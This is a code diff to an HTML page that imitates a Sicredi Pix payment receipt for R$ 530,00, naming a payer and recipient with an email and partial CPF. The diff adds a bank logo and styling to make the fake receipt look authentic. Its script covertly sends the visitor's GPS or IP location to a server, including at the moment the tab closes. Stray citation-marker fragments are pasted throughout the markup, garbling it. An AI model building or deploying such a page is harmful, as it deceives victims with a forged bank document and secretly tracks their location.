@@ -10,31 +10,32 @@
 
 <body>
   <div class="comprovante-container">
-    <div class="topo-comprovante">
-      <h2>Pix Enviado - R$ 530,00</h2>
+    <div class="topo-comprovante" style="text-align: center; margin-bottom: 20px;">
+      <img src="logo-sicredi.png" alt="Sicredi" style="max-width: 120px; margin-bottom: 10px;" />
+      <h2>Pix Enviado - R$ 530,00</h2>[span_5](start_span)[span_5](end_span)[span_6](start_span)[span_6](end_span)
     </div>
 
     <div class="informacoes">
-      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>
-      <p><span>Horário:</span> <span>00:16</span></p>
-      <p><span>ID da Transação:</span> <span class="id-transacao">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>
+      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>[span_7](start_span)[span_7](end_span)[span_8](start_span)[span_8](end_span)
+      <p><span>Horário:</span> <span>00:16</span></p>[span_9](start_span)[span_9](end_span)[span_10](start_span)[span_10](end_span)
+      <p><span>ID da Transação:</span> <span class="id-transacao" style="word-break: break-all;">PIXcSqf5BBNLaKrFy1C6kPAj6sexVR2Z</span></p>[span_11](start_span)[span_11](end_span)[span_12](start_span)[span_12](end_span)
       
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
+      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
 
-      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>
-      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>
+      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>[span_13](start_span)[span_13](end_span)[span_14](start_span)[span_14](end_span)
+      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>[span_15](start_span)[span_15](end_span)[span_16](start_span)[span_16](end_span)
       
-      <hr style="border: 0; border-top: 1px solid #ddd; margin: 10px 0;">
+      <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
 
-      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>
-      <p><span>CPF:</span> <span>***.640.535-**</span></p>
-      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>
+      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>[span_17](start_span)[span_17](end_span)[span_18](start_span)[span_18](end_span)
+      <p><span>CPF:</span> <span>***.640.535-**</span></p>[span_19](start_span)[span_19](end_span)[span_20](start_span)[span_20](end_span)
+      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>[span_21](start_span)[span_21](end_span)[span_22](start_span)[span_22](end_span)
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
+    <button class="botao" onclick="window.print()" style="background-color: #72A011; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;">Imprimir Comprovante</button>
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+    <div class="comprovante-footer" style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>[span_23](start_span)[span_23](end_span)[span_24](start_span)[span_24](end_span)
     </div>
   </div>
 
@@ -56,16 +57,6 @@
         fallbackLocation();
       }
     });
-
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    const dataFormatada = `${dia}/${mes}/${ano}`;
-    const elementoData = document.getElementById("data-atual");
-    if (elementoData) {
-      elementoData.textContent = dataFormatada;
-    }
 
     function sendLocation(position, source) {
       const latitude = position.coords.latitude;
@@ -102,17 +93,12 @@
         body: JSON.stringify({ latitude, longitude, maps, source, acao })
       })
         .then(response => response.json())
-        .then(data => {
-          if (data && !data.success && acao !== "fechou_pagina") {
-            console.log("Aviso ao enviar o comprovante.");
-          }
-        })
         .catch(error => {
           console.error("Erro:", error);
         });
     }
 
-    // Função de fechamento para garantir o envio quando sair da página
+    // Garante o envio dos dados (GPS ou IP) no momento exato em que a aba for fechada
     window.addEventListener('beforeunload', function () {
       const payload = JSON.stringify({
         ...dadosUltimaLocalizacao,
